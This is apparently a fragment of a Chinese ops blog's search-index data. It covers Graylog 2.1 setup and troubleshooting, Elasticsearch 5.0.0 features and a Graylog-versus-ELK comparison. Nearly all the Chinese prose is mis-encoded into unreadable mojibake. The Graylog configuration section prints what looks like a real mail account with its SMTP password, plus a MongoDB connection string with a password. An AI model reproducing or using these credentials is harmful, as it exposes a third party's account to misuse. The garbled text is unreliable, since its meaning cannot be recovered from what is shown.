è¿™é‡Œmongodbæ˜¯å®‰è£…åœ¨æˆ‘åŒä¸€å°æœåŠ¡å™¨ä¸Šé¢çš„ã€‚å¦‚æœè¦æŠŠmongodbå•ç‹¬æœåŠ¡å™¨è·‘è¿æ¥æ–¹å¼é…ç½®æ–‡ä»¶é‡Œé¢ä¹Ÿæœ‰ä¾‹å­è¯´æ˜ï¼š 1mongodb_uri =mongodb://graylog:123456@160.17.2.251:27017/graylog2 #è¿æ¥åˆ°mongodbçš„æœåŠ¡å™¨åœ°å€ä¸º160.17.2.251:27017ï¼Œè´¦å·ä¸ºgraylogï¼Œå¯†ç ä¸º123456 æ•°æ®åº“ä¸ºgraylog2 è®¾ç½®å‘Šè­¦é‚®ä»¶å‘é€è€…ä¿¡æ¯ 1234567891011 # Email transporttransport_email_enabled = falsetransport_email_hostname = smtp.exmail.qq.comtransport_email_port = 465transport_email_use_auth = truetransport_email_use_tls = truetransport_email_use_ssl = truetransport_email_auth_username = chengyangyang@qq.cntransport_email_auth_password = beneTqqtransport_email_subject_prefix = [graylog]transport_email_from_email = chengyangyang@qq.cn (4)å¤åˆ¶é…ç½®æ–‡ä»¶ å› ä¸ºgraylogå®‰è£…binç›®å½•ä¸‹ï¼Œé»˜è®¤å¯åŠ¨é…ç½®æ–‡ä»¶ é…ç½®æ–‡ä»¶è·¯å¾„ï¼š/etc/graylog/server/server.conf æ‰€ä»¥éœ€è¦å°†graylog.conf.example å¤åˆ¶åˆ°/etc/graylog/server/ç›®å½•ä¸‹ï¼Œå¹¶ä¸”æ”¹å server.conf æ‰§è¡Œå‘½ä»¤ï¼š 12mkdir -p /etc/graylog/server/ cp graylog.conf.example /etc/graylog/server/server.conf (5)å¯åŠ¨graylog åœ¨graylogå®‰è£…binç›®å½•ä¸‹æ‰§è¡Œ 1./graylogctl start æŸ¥çœ‹æ—¥å¿—ï¼Œåœ¨graylogå®‰è£…ç›®å½•ä¸‹æ‰§è¡Œ 1tail -200f /log/graylog-server.log å¦‚æœæŠ¥é”™ï¼š åŸå› ï¼š åœ¨mongodbç‰ˆæœ¬2.6ä¹‹åï¼Œæ˜¯éœ€è¦æ—¥å¿—journalingè®¾ç½®çš„ï¼Œè€Œé»˜è®¤æƒ…å†µä¸‹æ˜¯å…³é—­çš„ è§£å†³åŠæ³•ï¼š åœ¨mongodbå¯åŠ¨å‘½ä»¤åŠ ä¸Š â€“journal æœ€åå¯åŠ¨å‘½ä»¤ï¼š 1./mongod --dbpath=/usr/local/mongodb/data/ --fork --logpath=/usr/local/mongodb/logs --storageEngine=mmapv1 --journal é‡å¯mongodbåï¼Œé‡å¯graylogæœåŠ¡å³å¯ï¼ (6)å¯åŠ¨graylog(æŠ¥é”™äºŒ) æŸ¥çœ‹æ—¥å¿—ï¼Œåœ¨graylogå®‰è£…ç›®å½•ä¸‹æ‰§è¡Œ 12tail -200f /log/graylog-server.log 12345678&#123;com.mongodb.MongoSocketOpenException: Exception opening socket&#125;, caused by &#123;java.net.ConnectException: æ‹’ç»è¿æ¥&#125;&#125;]&#125;. Waiting for 30000 ms before timing out2016-11-22 15:10:29,355 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Elastic Beats Input 1.1.1 [org.graylog.plugins.beats.BeatsInputPlugin]2016-11-22 15:10:29,357 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Collector 1.1.1 [org.graylog.plugins.collector.CollectorPlugin]2016-11-22 15:10:29,357 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Enterprise Integration Plugin 1.1.1 [org.graylog.plugins.enterprise_integration.EnterpriseIntegrationPlugin]2016-11-22 15:10:29,358 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: MapWidgetPlugin 1.1.1 [org.graylog.plugins.map.MapWidgetPlugin]2016-11-22 15:10:29,359 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Pipeline Processor Plugin 1.1.1 [org.graylog.plugins.pipelineprocessor.ProcessorPlugin]2016-11-22 15:10:29,359 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Anonymous Usage Statistics 2.1.1 [org.graylog.plugins.usagestatistics.UsageStatsPlugin]2016-11-22 15:10:29,487 INFO : org.graylog2.bootstrap.CmdLineTool - Running with JVM arguments: -Djava.library.path=./../lib/sigar -Xms1g -Xmx1g -XX:NewRatio=1 -XX:+ResizeTLAB -XX:+UseConcMarkSweepGC -XX:+CMSConcurrentMTEnabled -XX:+CMSClassUnloadingEnabled -XX:+UseParNewGC -XX:-OmitStackTraceInFastThrow æç¤ºmongodb æ‹’ç»è¿æ¥ã€‚ è¿™ä¸ªæ—¶å€™éœ€è¦çœ‹ä¸‹ç«¯å£åœ°å€æ˜¯å¦æ˜¯IPåœ°å€è¿˜æ˜¯127.0.0.1 å¦‚æœä¸æ˜¯éœ€è¦ä¿®æ”¹ä¸‹åœ¨é‡å¯æœåŠ¡å°±å¯ä»¥äº†ã€‚ æŸ¥çœ‹å¯åŠ¨æœåŠ¡ç«¯å£ï¼š 123456789101112[root@graylog graylog-2.1.1]# netstat -ntulpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 127.0.0.1:27017 0.0.0.0:* LISTEN 22308/mongodtcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1974/sshdtcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1287/mastertcp 0 0 ::ffff:192.168.1.234:9350 :::* LISTEN 23642/javatcp 0 0 ::ffff:192.168.1.234:9000 :::* LISTEN 23642/javatcp 0 0 ::ffff:192.168.1.234:9200 :::* LISTEN 18405/javatcp 0 0 ::ffff:192.168.1.234:9300 :::* LISTEN 18405/javatcp 0 0 :::22 :::* LISTEN 1974/sshdtcp 0 0 ::1:25 :::* LISTEN 1287/master (6)è®¿é—®graylog graylogå¯åŠ¨æˆåŠŸåï¼Œæµè§ˆå™¨è®¿é—®ï¼šgraylogå®‰è£…IP:9000 å››ï¼šæ€»ç»“åˆ°æ­¤ï¼ŒåŸºç¡€çš„é›†ä¸­æ—¥å¿—ç®¡ç†graylogå®‰è£…å®Œæ¯•ï¼ï¼Œåç»­å°†ç»§ç»­ä»‹ç»ï¼š å®‰è£…éƒ¨ç½²Graylog Collector Sidecar æ”¶é›†åº”ç”¨æ—¥å¿— é‡‡ç”¨syslogæ”¶é›†æ—¥å¿—æ–¹å¼ graylogä¸€äº›ä½¿ç”¨ï¼ŒåŒ…æ‹¬æ—¥å¿—æˆªå–ï¼Œå‘Šè­¦ç­‰ã€‚ ä¹‹å‰ä¹Ÿå®è·µè¿‡ELKæŠ€æœ¯æ ˆï¼Œåæ¥é€‰å‹graylogï¼Œæ˜¯åŸºäºgraylogå¸¦æœ‰çš„æƒé™ç®¡ç†ï¼Œå’Œå‘Šè­¦åŠŸèƒ½æ¯”è¾ƒå®Œå–„ï¼","link":"/2016/11/14/æ—¥å¿—åˆ†æ\u0010å¹³å°/Graylog/graylog å‡çº§2.1 é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆ/"},{"title":"ç ”ç©¶å­¦ä¹  Elasticsearch 5.0.0 åŠŸèƒ½æå‡å“ªäº›,ESå¦‚ä½•å¼¹æ€§è¿ç§»æ—¥å¿—æ•°æ®ï¼Œå®‰è£…éœ€è¦ä»€ä¹ˆç¯å¢ƒï¼Ÿ","text":"ES ç°åœ¨æ™®éå¤§å…¬å¸éƒ½å·²ç»åœ¨ä½¿ç”¨ï¼Œæœ‰çš„ç”¨æ¥åšæ•°æ®å­˜å‚¨ï¼Œä¹Ÿæœ‰åšæ€§èƒ½ç›‘æ§ï¼Œä¹Ÿæœ‰åšæ—¥å¿—æ”¶é›†ï¼Œè·Ÿå¤§æ•°æ®ç»“åˆåšæ—¥å¿—åˆ†æã€‚ä»Šå¤©åœ¨å®¶æ— èŠç ”ç©¶å®˜ç½‘å­¦ä¹ äº†ä¸‹Elasticsearch5.0.0 åŠŸèƒ½æ–°å¢å“ªäº›ï¼Œä¸ªäººè§‰å¾—ESä¹Ÿæ˜¯ç°åœ¨å¼€æºæ—¥å¿—åˆ†æå¹³å°æ¯”è¾ƒç«çš„ï¼Œä»14å¹´å¼€å§‹é™†ç»­ä½¿ç”¨é¢‘ç‡ä¸æ–­æå‡ã€‚ä¹‹å‰ä¹Ÿæœ‰äº†è§£è¿‡Graylog ç°åœ¨æ¯”ES åšæ•°æ®å­˜å‚¨åˆ†æ ä¸é”™çš„æ˜¯Graylog æ¯”ESæ€§èƒ½å¥½ã€‚åºŸè¯ä¸å¤šè¯´äº†å“ˆå“ˆ Elasticsearch 5.0.0å‘å¸ƒ2016å¹´10æœˆ26æ—¥å‘å¸ƒ Elasticsearch 5.0.0 ä»Šå¤©å»ä¸‹è½½å§ï¼ä½ çŸ¥é“ä½ æƒ³ã€‚ ä¸‹è½½Elasticsearch 5.0.0Elasticsearch 5.0.0å‘è¡Œè¯´æ˜å¼¹æ€§æœç´¢5.0çªç ´å˜åŒ– Elasticsearch 5.0.0å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ© è¿™æ˜¯æœ‰å²ä»¥æ¥æœ€å¿«ï¼Œæœ€å®‰å…¨ï¼Œæœ€å…·å¼¹æ€§ï¼Œæœ€ç®€å•æ˜“ç”¨çš„Elasticsearchç‰ˆæœ¬ï¼Œå®ƒå…·æœ‰ä¸€ç³»åˆ—å¢å¼ºåŠŸèƒ½å’Œæ–°åŠŸèƒ½ã€‚ ç´¢å¼•æ€§èƒ½ å–é£ŸèŠ‚ç‚¹ æ— ç—›è„šæœ¬ æ–°çš„æ•°æ®ç»“æ„ æœç´¢å’Œèšåˆ ç”¨æˆ·å‹å¥½ å¼¹æ€§ Java RESTå®¢æˆ·ç«¯ è¿ç§»åŠ©æ‰‹ ä¸‹é¢ä»å®˜ç½‘ä¸Šé¢ç¿»è¯‘å¾—æ¥çš„ï¼š ç´¢å¼•æ€§èƒ½ç”±äºåŒ…æ‹¬æ›´å¥½çš„æ•°å­—æ•°æ®ç»“æ„ï¼ˆå‚è§æ–°æ•°æ®ç»“æ„ï¼‰çš„ä¸€äº›æ›´æ”¹ï¼Œç´¢å¼•ååé‡åœ¨5.0.0ä¸­æœ‰äº†æ˜¾ç€æ”¹å–„ï¼Œé”ä¸­çš„äº‰ç”¨å‡å°‘ï¼Œé˜»æ­¢å¯¹åŒä¸€æ–‡æ¡£çš„å¹¶å‘æ›´æ–°ï¼Œä»¥åŠå‡å°‘äº‹åŠ¡æ—¥å¿—æ—¶çš„é”å®šéœ€æ±‚ã€‚å¼‚æ­¥translog fsyncingå°†ç‰¹åˆ«æœ‰åˆ©äºæ—‹è½¬ç£ç›˜çš„ç”¨æˆ·ï¼Œè€Œä¾èµ–Elasticsearchè‡ªåŠ¨ç”Ÿæˆæ–‡æ¡£IDæ—¶ï¼Œä»…è¿½åŠ ç”¨ä¾‹ï¼ˆåŸºäºæ€è€ƒæ—¶é—´çš„äº‹ä»¶ï¼‰å…·æœ‰å¾ˆå¤§çš„ååé‡æé«˜ã€‚å¯¹å®æ—¶æ–‡æ¡£GETçš„æ”¯æŒçš„å†…éƒ¨å˜åŒ–æ„å‘³ç€ç´¢å¼•ç¼“å†²åŒºå¯ç”¨çš„å†…å­˜æ›´å¤šï¼Œåƒåœ¾æ”¶é›†æ—¶é—´å°‘å¾—å¤šã€‚ æ ¹æ®æ‚¨çš„ç”¨ä¾‹ï¼Œæ‚¨å¯èƒ½ä¼šçœ‹åˆ°åœ¨æé«˜ååé‡çš„25ï¼…è‡³80ï¼…ä¹‹é—´ã€‚ IngestèŠ‚ç‚¹ å‘Elasticsearchæ·»åŠ æ•°æ®æ›´ç®€å•äº†ã€‚Logstashæ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œè€Œä¸€äº›è¾ƒå°çš„ç”¨æˆ·åªéœ€è¦è¿‡æ»¤å™¨ï¼Œä¸éœ€è¦å®ƒæ‰€æä¾›çš„ä¼—å¤šè·¯ç”±é€‰é¡¹ã€‚å› æ­¤ï¼ŒElasticå°†ä¸€äº›æœ€æµè¡Œçš„Logstashè¿‡æ»¤å™¨ï¼ˆå¦‚grokã€splitï¼‰ç›´æ¥åœ¨Elasticsearchä¸­å®ç°ä¸ºå¤„ç†å™¨ã€‚å¤šä¸ªå¤„ç†å™¨å¯ä»¥ç»„åˆæˆä¸€ä¸ªç®¡é“ï¼Œåœ¨ç´¢å¼•æ—¶åº”ç”¨åˆ°æ–‡æ¡£ä¸Šã€‚ Painlessè„šæœ¬ Elasticsearchä¸­å¾ˆå¤šåœ°æ–¹ç”¨åˆ°äº†è„šæœ¬ï¼Œè€Œå‡ºäºå®‰å…¨è€ƒè™‘ï¼Œè„šæœ¬åœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯ç¦ç”¨çš„ï¼Œè¿™ä»¤äººç›¸å½“å¤±æœ›ã€‚ä¸ºæ­¤ï¼ŒElasticå¼€å‘äº†ä¸€ç§æ–°çš„è„šæœ¬è¯­è¨€Painlessã€‚è¯¥è¯­è¨€æ›´å¿«ã€æ›´å®‰å…¨ï¼Œè€Œä¸”é»˜è®¤æ˜¯å¯ç”¨çš„ã€‚ä¸ä»…å¦‚æ­¤ï¼Œå®ƒçš„æ‰§è¡Œé€Ÿåº¦æ˜¯Groovyçš„4å€ï¼Œè€Œä¸”æ­£åœ¨å˜å¾—æ›´å¿«ã€‚Painlesså·²ç»æˆä¸ºé»˜è®¤è„šæœ¬è¯­è¨€ï¼Œè€ŒGroovyã€Javascriptå’ŒPythonéƒ½é­åˆ°å¼ƒç”¨ã€‚è¦äº†è§£æœ‰å…³è¿™é—¨æ–°è¯­è¨€çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·ç‚¹å‡»è¿™é‡Œã€‚ æ–°æ•°æ®ç»“æ„ Lucene 6å¸¦æ¥äº†ä¸€ä¸ªæ–°çš„Points æ•°æ®ç»“æ„K-Dæ ‘ï¼Œç”¨äºå­˜å‚¨æ•°å€¼å‹å’Œåœ°ç†ä½ç½®å­—æ®µï¼Œå½»åº•æ”¹å˜äº†æ•°å€¼å‹å€¼çš„ç´¢å¼•å’Œæœç´¢æ–¹å¼ã€‚åŸºå‡†æµ‹è¯•è¡¨æ˜ï¼ŒPointså°†æŸ¥è¯¢é€Ÿåº¦æå‡äº†36%ï¼Œå°†ç´¢å¼•é€Ÿåº¦æå‡äº†71%ï¼Œè€Œå ç”¨çš„ç£ç›˜å’Œå†…å­˜ç©ºé—´åˆ†åˆ«å‡å°‘äº†66%å’Œ85%ï¼ˆå‚è§â€œåœ¨5.0ä¸­æœç´¢æ•°å€¼â€ï¼‰ã€‚ æœç´¢å’Œèšåˆ å€ŸåŠ©å³æ—¶èšåˆï¼ŒKibanaå›¾è¡¨ç”Ÿæˆé€Ÿåº¦æ˜¾è‘—æå‡ã€‚Elasticç”¨ä¸€å¹´çš„æ—¶é—´å¯¹æœç´¢APIè¿›è¡Œäº†é‡æ„ï¼ŒElasticsearchç°åœ¨å¯ä»¥æ›´å·§å¦™åœ°æ‰§è¡ŒèŒƒå›´æŸ¥è¯¢ï¼Œåªé’ˆå¯¹å·²ç»å‘ç”Ÿå˜åŒ–çš„ç´¢å¼•é‡æ–°è®¡ç®—èšåˆï¼Œè€Œä¸æ˜¯é’ˆå¯¹æ¯ä¸ªæŸ¥è¯¢ä»å¤´å¼€å§‹é‡æ–°è®¡ç®—ã€‚åœ¨æœç´¢æ–¹é¢ï¼Œé»˜è®¤çš„ç›¸å…³æ€§è®¡ç®—å·²ç»ç”±TF/IDFæ¢æˆäº†æ›´å…ˆè¿›çš„BM25ã€‚è¡¥å…¨å»ºè®®ç¨‹åºç»è¿‡äº†å®Œå…¨é‡å†™ï¼Œå°†å·²åˆ é™¤çš„æ–‡æ¡£ä¹Ÿè€ƒè™‘äº†è¿›æ¥ã€‚ æ›´å‹å¥½ Elasticsearch 5.0æ›´å®‰å…¨ã€æ›´æ˜“ç”¨ã€‚ä»–ä»¬é‡‡ç”¨äº†â€œå°½æ—©æç¤ºâ€çš„æ–¹æ³•ã€‚å¦‚æœå‡ºç°äº†é—®é¢˜ï¼Œåˆ™æ–°ç‰ˆæœ¬ä¼šåŠæ—©ç»™å‡ºæç¤ºã€‚ä¾‹å¦‚ï¼ŒElasticsearch 5.0ä¼šä¸¥æ ¼éªŒè¯è®¾ç½®ã€‚å¦‚æœå®ƒä¸èƒ½è¯†åˆ«æŸé¡¹è®¾ç½®çš„å€¼ï¼Œå°±ä¼šç»™å‡ºæç¤ºå’Œå»ºè®®ã€‚ä¸ä»…å¦‚æ­¤ï¼Œé›†ç¾¤å’Œç´¢å¼•è®¾ç½®ç°åœ¨å¯ä»¥é€šè¿‡nullè¿›è¡Œè§£é™¤ã€‚æ­¤å¤–ï¼Œè¿˜æœ‰å…¶ä»–çš„ä¸€äº›æ”¹è¿›ï¼Œä¾‹å¦‚ï¼Œrolloverå’Œshrink APIå¯ç”¨äº†ä¸€ç§æ–°çš„æ¨¡å¼æ¥ç®¡ç†åŸºäºæ—¶é—´çš„ç´¢å¼•ï¼Œå¼•å…¥æ–°çš„cluster-allocation-explain APIï¼Œç®€åŒ–ç´¢å¼•åˆ›å»ºã€‚ å¼¹æ€§ Elasticsearchåˆ†å¸ƒå¼æ¨¡å‹çš„æ¯ä¸€éƒ¨åˆ†éƒ½è¢«åˆ†è§£ã€é‡æ„å’Œç®€åŒ–ï¼Œæå‡äº†å¯é æ€§ã€‚é›†ç¾¤çŠ¶æ€æ›´æ–°ç°åœ¨ä¼šç­‰å¾…é›†ç¾¤ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ç¡®è®¤ã€‚å¦‚æœä¸€ä¸ªâ€œå¤åˆ¶ç‰‡ï¼ˆreplica shardï¼‰â€è¢«â€œä¸»ç‰‡ï¼ˆprimaryï¼‰â€æ ‡è®°ä¸ºå¤±è´¥ï¼Œåˆ™ä¸»ç‰‡ä¼šç­‰å¾…â€œä¸»èŠ‚ç‚¹ï¼ˆmasterï¼‰â€çš„å“åº”ã€‚ç´¢å¼•ç°åœ¨ä½¿ç”¨æ•°æ®è·¯å¾„ä¸­çš„UUIDï¼Œè€Œä¸æ˜¯ç´¢å¼•åï¼Œé¿å…äº†å‘½åå†²çªã€‚å¦å¤–ï¼ŒElasticsearchç°åœ¨è¿›è¡Œå¯åŠ¨æ£€æŸ¥ï¼Œç¡®ä¿ç³»ç»Ÿé…ç½®æ²¡æœ‰é—®é¢˜ã€‚é…ç½®æ¯”è¾ƒéº»çƒ¦ï¼Œä½†å¦‚æœåªæ˜¯è¯•ç”¨ï¼Œå¼€å‘äººå‘˜ä¹Ÿå¯ä»¥é€‰æ‹©localhost-onlyæ¨¡å¼ï¼Œé¿å…ç¹ççš„é…ç½®ã€‚å¦å¤–ï¼Œæ–°ç‰ˆæœ¬è¿˜å¢åŠ äº†æ–­è·¯å™¨åŠå…¶ä»–ä¸€äº›è½¯é™åˆ¶ï¼Œé™åˆ¶è¯·æ±‚ä½¿ç”¨çš„å†…å­˜å¤§å°ï¼Œä¿æŠ¤é›†ç¾¤å…å—æ¶æ„ç”¨æˆ·æ”»å‡»ã€‚ æ­¤å¤–ï¼Œè¯¥ç‰ˆæœ¬è¿˜æä¾›äº†ä¸€ä¸ªåº•å±‚çš„Java REST/HTTPå®¢æˆ·ç«¯ï¼Œå¯ä»¥ç”¨äºç›‘å¬ã€æ—¥å¿—è®°å½•ã€è¯·æ±‚è½®è¯¢ã€æ•…éšœèŠ‚ç‚¹é‡è¯•ç­‰ã€‚å®ƒä½¿ç”¨Java 7ï¼Œå°†ä¾èµ–é™åˆ°äº†æœ€ä½ï¼Œæ¯”Transportå®¢æˆ·ç«¯çš„ä¾èµ–å†²çªå°‘ã€‚è€Œåœ¨åŸºå‡†æµ‹è¯•ä¸­ï¼Œå®ƒçš„æ€§èƒ½å¹¶ä¸è¾“äºTransportå®¢æˆ·ç«¯ã€‚ä¸è¿‡ï¼Œè¿™æ˜¯ä¸€ä¸ªåº•å±‚å®¢æˆ·ç«¯ï¼Œç›®å‰è¿˜æ²¡æœ‰æä¾›ä»»ä½•æŸ¥è¯¢æ„å»ºå™¨æˆ–è¾…åŠ©å™¨ã€‚å®ƒçš„è¾“å…¥å‚æ•°å’Œè¾“å‡ºç»“æœéƒ½æ˜¯JSONã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¯¥ç‰ˆæœ¬å¼•å…¥äº†è®¸å¤šç ´åæ€§æ›´æ”¹ï¼Œå¥½åœ¨ä»–ä»¬æä¾›äº†ä¸€ä¸ªè¿ç§»è¾…åŠ©æ’ä»¶ï¼Œå¯ä»¥å¸®åŠ©å¼€å‘äººå‘˜ä»Elasticsearch 2.3.x/2.4.xè¿ç§»åˆ°Elasticsearch 5.0ã€‚å¦‚æœæ˜¯ä»æ›´æ—©çš„Elasticsearchç‰ˆæœ¬å‘æœ€æ–°çš„5.0ç‰ˆæœ¬è¿ç§»ï¼Œåˆ™è¯·æŸ¥é˜…å‡çº§æ–‡æ¡£ã€‚ Java RESTå®¢æˆ·ç«¯ç»è¿‡å¤šå¹´çš„ç­‰å¾…ï¼Œæˆ‘ä»¬ç»ˆäºå‘å¸ƒäº†ä¸€ä¸ªä½çº§çš„Java HTTP / RESTå®¢æˆ·ç«¯ã€‚å®ƒæä¾›äº†ä¸€ä¸ªç®€å•çš„HTTPå®¢æˆ·ç«¯ï¼Œå…·æœ‰æœ€å°‘çš„ä¾èµ–å…³ç³»ï¼Œå¯ä»¥å¤„ç†å—…æ¢ï¼Œè®°å½•ï¼Œå¾ªç¯è¯·æ±‚ï¼Œå¹¶é‡è¯•èŠ‚ç‚¹æ•…éšœã€‚å®ƒä½¿ç”¨çš„RESTå±‚å†å²ä¸Šæ¯”Java APIæ›´ç¨³å®šï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥è·¨è¶Šå‡çº§ä½¿ç”¨ï¼Œç”šè‡³å¯èƒ½åœ¨ä¸»è¦ç‰ˆæœ¬ä¹‹é—´è¿›è¡Œå‡çº§ã€‚å®ƒä¸Java 7ä¸€èµ·å·¥ä½œï¼Œå¹¶ä¸”å…·æœ‰æœ€å°çš„ä¾èµ–æ€§ï¼Œå¯¼è‡´æ¯”ä¼ è¾“å®¢æˆ·ç«¯æ›´å°‘çš„ä¾èµ–å†²çªã€‚å®ƒåªæ˜¯HTTPï¼Œå› æ­¤å¯ä»¥åƒæ‰€æœ‰å…¶ä»–HTTPå®¢æˆ·ç«¯ä¸€æ ·è¿›è¡Œé˜²ç«å¢™/ä»£ç†ã€‚åœ¨æˆ‘ä»¬çš„åŸºå‡†æµ‹è¯•ä¸­ï¼ŒJava RESTå®¢æˆ·ç«¯ ä¸Transportå®¢æˆ·ç«¯çš„åŠŸèƒ½ç±»ä¼¼ã€‚ è¯·æ³¨æ„ï¼Œè¿™æ˜¯ä¸€ä¸ªä½çº§å®¢æˆ·ç«¯ã€‚åœ¨è¿™ä¸ªé˜¶æ®µï¼Œæˆ‘ä»¬ä¸æä¾›ä»»ä½•å¯ä»¥åœ¨IDEä¸­è‡ªåŠ¨å®Œæˆçš„æŸ¥è¯¢æ„å»ºå™¨æˆ–å¸®åŠ©å™¨ã€‚å®ƒæ˜¯JSON-inï¼ŒJSON-outï¼Œç”±ä½ æ¥æ„å»ºJSONã€‚å¼€å‘ä¸ä¼šåœæ­¢åœ¨è¿™é‡Œ - æˆ‘ä»¬å°†æ·»åŠ ä¸€ä¸ªAPIï¼Œå®ƒå°†å¸®åŠ©æ‚¨æ„å»ºæŸ¥è¯¢å¹¶è§£æå“åº”ã€‚æ‚¨å¯ä»¥æŒ‰ç…§é—®é¢˜ï¼ƒ19055ä¸­çš„æ›´æ”¹è¿›è¡Œæ“ä½œã€‚ è¿ç§»åŠ©æ‰‹Elasticsearch Migration Helperæ˜¯ä¸€ä¸ªç½‘ç«™æ’ä»¶ï¼Œå¯ä»¥å¸®åŠ©ä»Elasticsearch 2.3.x / 2.4.xè¿ç§»åˆ°Elasticsearch 5.0ã€‚å®ƒæœ‰ä¸‰ä¸ªå·¥å…·ï¼š 123456é›†ç¾¤æ£€æŸ¥å¯¹é›†ç¾¤ï¼ŒèŠ‚ç‚¹å’Œç´¢å¼•æ‰§è¡Œä¸€ç³»åˆ—æ£€æŸ¥ï¼Œå¹¶æé†’æ‚¨å‡çº§ä¹‹å‰éœ€è¦è§£å†³çš„ä»»ä½•å·²çŸ¥é—®é¢˜ã€‚ReindexåŠ©æ‰‹åœ¨v2.0.0ä¹‹å‰åˆ›å»ºçš„ç´¢å¼•éœ€è¦é‡æ–°ç¼–å·ï¼Œæ‰èƒ½åœ¨Elasticsearch 5.xä¸­ä½¿ç”¨ã€‚reindexå¸®åŠ©å™¨ç‚¹å‡»ä¸€ä¸ªæŒ‰é’®å‡çº§æ—§ç´¢å¼•ã€‚å¼ƒç”¨æ—¥å¿—Elasticsearché™„å¸¦äº†ä¸€ä¸ªå¼ƒç”¨è®°å½•å™¨ï¼Œæ¯å½“ä½¿ç”¨ä¸æ¨èä½¿ç”¨çš„åŠŸèƒ½æ—¶ï¼Œå®ƒå°†è®°å½•æ¶ˆæ¯ã€‚æ­¤å·¥å…·å¯å¯ç”¨æˆ–ç¦ç”¨ç¾¤é›†ä¸Šçš„å¼ƒç”¨æ—¥å¿—è®°å½•ã€‚ å®˜ç½‘æ¨èè¿ç§»æ–‡æ¡£ï¼šInstruction for install the Elasticsearch migration helper. ) Elasticsearch 5.0.0 å®‰è£…éœ€è¦å“ªäº›è¦æ±‚ã€‚Elasticsearchéœ€è¦ä¾èµ–Java JDK1.8 Communicative learning:ğŸ§ Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)ğŸ§ BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/03/30/æ—¥å¿—åˆ†æ\u0010å¹³å°/Elasticsearch/ç ”ç©¶å­¦ä¹  Elasticsearch 5.0.0 åŠŸèƒ½æå‡å“ªäº›,ESå¦‚ä½•å¼¹æ€§è¿ç§»æ—¥å¿—æ•°æ®ï¼Œå®‰è£…éœ€è¦ä»€ä¹ˆç¯å¢ƒï¼Ÿ/"},{"title":"Graylogâ€”â€”æ—¥å¿—åˆ†æå¹³å°å®Œç¾ä»£æ›¿Elasticsearch","text":"æ‘˜è¦: æèµ·æ—¥å¿—èšåˆå·¥å…·ï¼Œæœ‰å¼€æºç•Œçš„ELKï¼Œå•†ä¸šç•Œçš„Splunkï¼Œä½†æˆ‘è¦ä»‹ç»å¼€æºçš„åèµ·ä¹‹ç§€Graylogï¼Œå¯ä»¥è¯´æ˜¯é¾™å¤´è€å¤§Splunkçš„å¼€æºç‰ˆã€‚ Graylogâ€”â€”æ—¥å¿—åˆ†æå¹³å°å®Œç¾ä»£æ›¿Elasticsearchå…ˆçœ‹çœ‹ æ¨èï¼å›½å¤–ç¨‹åºå‘˜æ•´ç†çš„ç³»ç»Ÿç®¡ç†å‘˜èµ„æºå¤§å…¨ ä¸­ï¼Œå›½å¤–ç¨‹åºå‘˜æ•´ç†çš„æ—¥å¿—èšåˆå·¥å…·çš„åˆ—è¡¨ï¼š æ—¥å¿—ç®¡ç†å·¥å…·ï¼šæ”¶é›†ï¼Œè§£æï¼Œå¯è§†åŒ– Elasticsearch - ä¸€ä¸ªåŸºäºLuceneçš„æ–‡æ¡£å­˜å‚¨ï¼Œä¸»è¦ç”¨äºæ—¥å¿—ç´¢å¼•ã€å­˜å‚¨å’Œåˆ†æã€‚ Fluentd - æ—¥å¿—æ”¶é›†å’Œå‘å‡º Flume -åˆ†å¸ƒå¼æ—¥å¿—æ”¶é›†å’Œèšåˆç³»ç»Ÿ Graylog2 -å…·æœ‰æŠ¥è­¦é€‰é¡¹çš„å¯æ’å…¥æ—¥å¿—å’Œäº‹ä»¶åˆ†ææœåŠ¡å™¨ Heka -æµå¤„ç†ç³»ç»Ÿï¼Œå¯ç”¨äºæ—¥å¿—èšåˆ Kibana - å¯è§†åŒ–æ—¥å¿—å’Œæ—¶é—´æˆ³æ•°æ® Logstash -ç®¡ç†äº‹ä»¶å’Œæ—¥å¿—çš„å·¥å…· Octopussy -æ—¥å¿—ç®¡ç†è§£å†³æ–¹æ¡ˆï¼ˆå¯è§†åŒ–/æŠ¥è­¦/æŠ¥å‘Šï¼‰ Graylogä¸ELKæ–¹æ¡ˆçš„å¯¹æ¯” ELKï¼š Logstash -&gt; Elasticsearch -&gt; Kibana ï¼ˆä½¿ç”¨äº†ä¸€äº›æ’ä»¶head ï¼Œmarvelï¼‰ Graylogï¼š Graylog Collector -&gt; Graylog Server(å°è£…Elasticsearch) -&gt; Graylog Web åšä¸ºè¿ç»´ï¼Œå…¬å¸å†…éƒ¨ä½¿ç”¨elkå¤„ç†æ—¥å¿—å‘ç°å¾ˆå¤šé—®é¢˜ã€‚ é¡ºä¾¿æˆªå›¾äº†å‡ å¼ ï¼š ä¹‹å‰è¯•è¿‡Logstash + Elasticsearch + Kibanaçš„æ–¹æ¡ˆï¼Œå‘ç°æœ‰å‡ ä¸ªç¼ºç‚¹ï¼š ä¸èƒ½å¤„ç†å¤šè¡Œæ—¥å¿—ï¼Œæ¯”å¦‚Mysqlæ…¢æŸ¥è¯¢ï¼ŒTomcat/Jettyåº”ç”¨çš„Javaå¼‚å¸¸æ‰“å° 